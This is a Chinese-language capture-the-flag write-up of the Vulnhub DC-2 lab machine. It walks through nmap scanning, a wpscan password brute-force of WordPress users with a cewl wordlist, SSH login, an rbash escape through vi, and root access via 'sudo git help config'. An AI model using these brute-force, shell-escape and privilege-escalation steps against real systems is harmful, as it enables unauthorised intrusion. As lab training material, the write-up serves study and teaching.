---
title: Vulnhub-DC-2
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-2

> [https://download.vulnhub.com/dc/DC-2.zip](https://download.vulnhub.com/dc/DC-2.zip)
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`157`
    
    ```php
    nmap -sP 192.168.75.0/24     
    //            
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 19:51 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00030s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.157
    Host is up (0.00095s latency).
    MAC Address: 00:0C:29:9B:07:95 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00067s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.157
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 20:39 CST
    Nmap scan report for 192.168.75.157
    Host is up (0.0056s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    80/tcp   open  http
    7744/tcp open  raqmon-pdu
    MAC Address: 00:0C:29:9B:07:95 (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sT -sV -O -p 80,7744 192.168.75.157  
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 20:40 CST
    Nmap scan report for 192.168.75.157
    Host is up (0.00096s latency).
    
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
    7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
    MAC Address: 00:0C:29:9B:07:95 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
    原来`7744`是`SSH`
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p80,7744 192.168.75.157
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 20:48 CST
    Nmap scan report for 192.168.75.157
    Host is up (0.0013s latency).
    
    PORT     STATE SERVICE
    80/tcp   open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-wordpress-users: 
    | Username found: admin
    | Username found: tom
    | Username found: jerry
    |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
    | http-enum: 
    |   /wp-login.php: Possible admin folder
    |   /readme.html: Wordpress version: 2 
    |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
    |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
    |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
    |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
    |   /wp-login.php: Wordpress login page.
    |   /wp-admin/upgrade.php: Wordpress login page.
    |_  /readme.html: Interesting, a readme.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    7744/tcp open  raqmon-pdu
    MAC Address: 00:0C:29:9B:07:95 (VMware)
    ```
    

## web渗透

1. 前面`nmap`扫描出是`wordpress`的CMS,并且得出几个用户名`admin` `tom` `jerry` ,和一些让人感兴趣的路径
    
    进入主页存在`flag`选项卡得到`flag1`
    
    ![image.png](image%2024.png)
    
    ```sql
    # flag1
    Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
    
    More passwords is always better, but sometimes you just can’t win them all.
    
    Log in as one to see the next flag.
    
    If you can’t find it, log in as another
    ```
    
    提示到呢`cewl` ，先用`cewl` 对`dc-2` 生成字典，备用
    
    ```sql
    cewl http://dc-2 > dc2.txt
    ```
    
2. F12可以找到wordpress版本是`WordPress 4.7.10` ，得知当前用户 `admin` `tom` `jerry` 将他们存为`dc2u.txt` ,通过`flag1`给的提示，使用上面生成`dc2.txt` 来做用户密码爆破
    
    ```sql
    wpscan --url http://dc-2 -U dc2u.txt -P dc2.txt 
    //
    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
             WordPress Security Scanner by the WPScan Team
                             Version 3.8.22
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    
    [+] URL: http://dc-2/ [192.168.75.157]
    [+] Started: Sat Sep 28 21:41:44 2024
    
    Interesting Finding(s):
    
    [+] Headers
     | Interesting Entry: Server: Apache/2.4.10 (Debian)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    
    [+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
    
    [+] WordPress readme found: http://dc-2/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    
    [+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
     | Found By: Rss Generator (Passive Detection)
     |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
     |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
    
    [+] WordPress theme in use: twentyseventeen
     | Location: http://dc-2/wp-content/themes/twentyseventeen/
     | Last Updated: 2024-07-16T00:00:00.000Z
     | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
     | [!] The version is out of date, the latest version is 3.7
     | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
     | Style Name: Twenty Seventeen
     | Style URI: https://wordpress.org/themes/twentyseventeen/
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 1.2 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'
    
    [+] Enumerating All Plugins (via Passive Methods)
    
    [i] No plugins Found.
    
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:00 <====================================================> (137 / 137) 100.00% Time: 00:00:00
    
    [i] No Config Backups Found.
    
    [+] Performing password attack on Xmlrpc against 3 user/s
    Trying root / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 <> (0 / 717)  0.00%  ETA: Trying jerry / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 <> (3 / 717)  0.41%  ETA:[SUCCESS] - jerry / adipiscing                                                                                                     
    [SUCCESS] - tom / parturient                                                                                                       
    Trying root / flag Time: 00:01:04 <==================================                          > (649 / 1127) 57.58%  ETA: ??:??:??
    
    [!] Valid Combinations Found:
     | Username: jerry, Password: adipiscing
     | Username: tom, Password: parturient
    
    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
    ```
    
    得到 `tom` `jerry` 的密码
    
    ```sql
    | Username: jerry, Password: adipiscing
    | Username: tom, Password: parturient
    ```
    
3. 登陆后台
    - 先登录`jerry`的后台
        
        在主页 `Pages` 里面可以找到 `flag2`
        
        ```sql
        Flag 2:
        
        If you can't exploit WordPress and take a shortcut, there is another way.
        
        Hope you found another entry point.
        ```
        
        `jerry`的`email`  jerry@notreallyanywhere.net
        
    - `tom` 的后台
        
        没有可利用的
        
4. 根据 `Hope you found another entry point.` ，因为`7744`端口是`ssh`，使用这两个用户尝试登录
    - 使用tom登陆成功，获得shell
        
        ```sql
        ssh tom@192.168.75.157 -p 7744
        tom@192.168.75.157's password: 
        
        The programs included with the Debian GNU/Linux system are free software;
        the exact distribution terms for each program are described in the
        individual files in /usr/share/doc/*/copyright.
        
        Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
        permitted by applicable law.
        tom@DC-2:~$ 
        ```
        
    - 当前目录下下存在 `flag3.txt` ,发现 `vim` `cat` `more` 等命令是使用不了的，用的是 `vi`
        
        ```sql
        Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
        ```
        
    - 查看`tom`可以使用的命令
        
        ```sql
        tom@DC-2:~$ ls -al usr/bin
        //
        lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -> /usr/bin/less
        lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -> /bin/ls
        lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -> /usr/bin/scp
        lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -> /usr/bin/vi
        ```
        
    - 根据 `flag3`的提示
        
        ```sql
        Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
        ```
        
        提示 `su for ..`
        
        因为我们的`shell`是`rbash` ，所以可能是`rbash`逃逸
        
        ```sql
        vi flag3.txt
        
        :set shell=/bin/sh
        :shell
        //进入shell
        //然后设置命令，不然就那几个
        export PATH=$PATH:/bin/
        export PATH=$PATH:/usr/bin/
        //env 查看环境变量
        ```
        
        根据提示 `su jerry` 使用之前得到的密码，登陆成功
        
    - 当前目录下存在`flag4`
        
        ```sql
        jerry@DC-2:~$ cat flag4.txt
        Good to see that you've made it this far - but you're not home yet. 
        
        You still need to get the final flag (the only flag that really counts!!!).  
        
        No hints here - you're on your own now.  :-)
        
        Go on - git outta here!!!!
        ```
        
        `git outta` 提示 `git` 提权（属于sudo提权里面的）
        
    - 查看当前权限，刚好是`git`
        
        ```sql
        jerry@DC-2:~$ sudo -l
        Matching Defaults entries for jerry on DC-2:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
        
        User jerry may run the following commands on DC-2:
            (root) NOPASSWD: /usr/bin/git
        ```
        
    - `git`提权
        
        ```sql
        sudo git help config
        :!/bin/bash
        ```
        
        ```sql
        root@DC-2:/home/jerry#
        ```
        
    - 获得`root`权限后，读取加目录下的`finalflag`即可
        
        ```sql
        root@DC-2:~# cat final-flag.txt 
        //
         __    __     _ _       _                    _ 
        / / /\ \ \___| | |   __| | ___  _ __   ___  / \
        \ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
         \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
          \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
        
        Congratulatons!!!
        
        A special thanks to all those who sent me tweets
        and provided me with feedback - it's all greatly
        appreciated.
        
        If you enjoyed this CTF, send me a tweet via @DCAU7.
        ```